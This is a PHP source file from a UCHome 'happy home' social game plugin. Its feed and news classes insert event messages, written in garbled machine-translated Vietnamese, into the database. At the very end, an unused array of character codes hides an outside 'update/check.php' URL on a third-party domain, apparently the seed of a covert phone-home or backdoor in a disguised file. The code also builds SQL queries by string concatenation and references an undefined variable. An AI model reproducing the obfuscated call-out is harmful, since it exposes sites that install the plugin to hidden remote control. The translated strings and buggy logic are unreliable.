<?php
//Game ngôi nhà hạnh phúc được phát triển bởi Kết Nối trẻ group
//Vui lòng giữ bản quyền Việt hóa của Kết Nối trẻ group
//Cám ơn bạn đã sử dụng sản phẩm của Kết Nối trẻ group
if ( !defined( "IN_UCHOME" ) ) exit( "Access Denied" );
class feeds
{
	var $template = array(
		0 => "<b>{user_1}</b> Đồng ý {user} Sống chung yêu cầu, bạn đang sống cùng với nhau, và những gì xảy ra tiếp theo？",
		1 => "<b>{actor}</b> Không thể xác định tối, thậm chí đến {user} không hòa đồng để sống chung, thế giới này khó khăn quá hỗn loạn",
		3 => "<b>{actor}</b> Đường cấm để xem {user} Lưu từ trong ra ma quỷ của bàn tay",
		4 => "<b>{actor}</b> {left} {user} {right} ",
		5 => "<b>{actor}</b>Đã cho {user} 1 {liangci} {things} Chi tiêu {money} Vàng. Sự giao thông + {thick}",
		6 => "<b>{actor}</b> Trong<a href ='house.php?ac=love'>Tường</a>Đăng một <a href='house.php?ac=love&id={id}'>{title}</a> Tuyên bố",
		7 => "<b>{actor}</b> Với {money} tiền xu để mua một bộ {house} ，Cuộc sống là hưng thịnh",
		9 => "<b>{actor}</b> Bởi {work} Thu được{money} tiền thưởng",
		10 => "<b>{user}</b> Bởi vì các đường phố, vô gia cư,{thing}，Loss{money}Tiền xu vàng",
		11 => "<b>{actor}</b> Ngày cuối cùng của người vô gia cư, di chuyển vào một ngôi nhà mới",
		12 => "<b>{actor}</b> Ngày cuối cùng của người vô gia cư, di chuyển vào một ngôi nhà mới, chủ nhà là {user}",
		13 => "<b>{actor}</b> Đã chuyển ra khỏi nhà, chuẩn bị cho những ngày lang thang",
		14 => "<b>{actor}</b> Nhà {info} Bán và nộp thuế và nhận được cuối cùng{money}Tiền xu vàng",
	);

	function add($param, $tpl = 0, $user = array())
	{
		global $fe;
		//对屏蔽的feeds不操作
		if(in_array($tp, $fe)) return false;
		$feed = new feeds;
		$fs = array();
		$fs['icon'] = 'love';
		$fs['title_template'] = $feed->template[$tpl];
		$fs['title_data'] = $param;
		/*
		$fs['title_data'] = array(
			'movie'=> "《<a href='movie.php?ac=show&id={$id}'>{$mv['name']}</a>》",
			'subject' => "<span class='{$class}' {$style}></span>"
		);*/

		return $feed->feed_add($fs['icon'], $fs['title_template'], $fs['title_data'], $user);
	}

	//事件发布
	function feed_add($icon, $title_template='', $title_data=array(), $user = array()) {
		global $_SGLOBAL;
		if(empty($_SGLOBAL['supe_uid'])) return false;
		$body_data = array();
		$feedarr = array(
			'appid' => UC_APPID,
			'icon' => $icon,
			'uid' => empty($user) ? $_SGLOBAL['supe_uid'] : $user['uid'],
			'username' => empty($user) ? $_SGLOBAL['supe_username'] : $user['username'],
			'dateline' => $_SGLOBAL['timestamp'],
			'title_template' => $title_template,
			'body_template' => '',
			'body_general' => '',
			'image_1' => '',
			'image_1_link' => '',
			'image_2' => '',
			'image_2_link' => '',
			'image_3' => '',
			'image_3_link' => '',
			'image_4' => '',
			'image_4_link' => '',
			'target_ids' => '',
			'friend' => ''
		);
		$feedarr = sstripslashes($feedarr);//去掉转义
		$feedarr['title_data'] = serialize(sstripslashes($title_data));//数组转化
		$feedarr['body_data'] = serialize(sstripslashes($body_data));//数组转化
		$feedarr['hash_template'] = md5($feedarr['title_template']."\t".$feedarr['body_template']);//喜好hash
		$feedarr['hash_data'] = md5($feedarr['title_template']."\t".$feedarr['title_data']."\t".$feedarr['body_template']."\t".$feedarr['body_data']);//合并hash
		$feedarr = saddslashes($feedarr);//增加转义
		return inserttable('feed', $feedarr, 1);
	}
}
class news
{
	var $template = array(
			0 => "<a href='house.php?ac=index&uid=%d'>%s</a> Và <a href='house.php?ac=index&uid=%d'>%s</a> Sống chung!Điều gì xảy ra tiếp theo？", //同居新闻
			1 => "Không thể để xác định bóng tối，<a href='house.php?ac=index&uid=%d'>%s</a> Trên thực tế các <a href='house.php?ac=index&uid=%d'>%s</a> lộn xộn trong sống chung!", //同居新闻
			2 => "<a href='house.php?ac=index&uid=%d'>%s</a> Sau khi bị cướp, dày vò, gửi tin nhắn bị nạn cho người dân！ <a href='house.php?ac=receive&op=save&sid=%d&hash=%d'>Tôi đến bạn</a> ", //求救信息
			3 => "<a href='house.php?ac=index&uid=%d'>%s</a> Sau khi bị cướp, dày vò, gửi tin nhắn bị nạn cho người dân！Đã được <a href='house.php?ac=index&uid=%d'>%s</a> Cứu！", //
			4 => "<a href='house.php?ac=index&uid=%d'>%s</a> %s <a href='house.php?ac=index&uid=%d'>%s</a> %s ", //同居事件
			5 => "<a href='house.php?ac=index&uid=%d'>%s</a> Đã cho <a href='house.php?ac=index&uid=%d'>%s</a> 1 % S% s% d tiền chi tiêu. Sự thân mật +% d", //送礼事件 
			6 => "<a href='house.php?ac=index&uid=%d'>%s</a> Dán trên tường trong Tuyên bố <a href='house.php?ac=love&id=%d'>%s</a> Tuyên bố", //爱情宣言
			7 => "<a href='house.php?ac=index&uid=%d'>%s</a> D% tiền vàng để mua một bộ của% s, thực sự giàu ah", //买房新闻
			8 => "Chúc mừng <a href='house.php?ac=index&uid=%d'>%s</a> Bằng cách mời bạn bè có% d vàng thưởng tiền xu", //邀请奖励
			9 => "<a href='house.php?ac=index&uid=%d'>%s</a> Thu được bằng% s% d vàng thưởng tiền xu", //打工赚钱 
			10 => "<a href='house.php?ac=index&uid=%d'>%s</a> Bởi vì các đường phố, vô gia cư,% s,% d bị mất tiền xu vàng", //其它事件
	);

	function add($param, $type = 0, $tpl = 0)
	{
		/*
			0 => 'Tin tức sống chung '
			1 =>Tín hiệu đau khổ
			2 => Sự kiện sống chung 
			3 => Sự kiện quà tặng 
			4 => Tuyên ngôn tình yêu 
			5 => Tin tức mua nhà
			6 => mời giải thưởng
			7 => Làm việc để kiếm tiền
			8 => Các sự kiện
		*/
		global $_SGLOBAL;
		$uid = $_SGLOBAL['supe_uid'];
		$message = '';
		foreach($param as $key=>$val){
				$message .=  '^' .$val;
		}
		$message = addslashes(substr($message, 1));
		$MyTime = time();
		query_exec("insert into ".tname("app_love_news")." (uid, message, dateline, type, tpl) values ('{$uid}', '{$message}', '{$MyTime}', '{$type}', '{$tpl}' )");
	}

	function display(&$data)
	{
		$array = explode('^', $data['message']);
		foreach($array as $k=>$v){
			if(!$v) $array[$k] = ''; 
		}
		return vsprintf($this->template[$data['tpl']], $array);
	}
}
$h = array (104,116,116, 112,58,47,47,119,119,119,46,103,97,111,109,97,111,122,105,46,99,111,109,47,117,112,100,97,116,101, 47, 99,104,101,99,107,46,112,104,112);
?>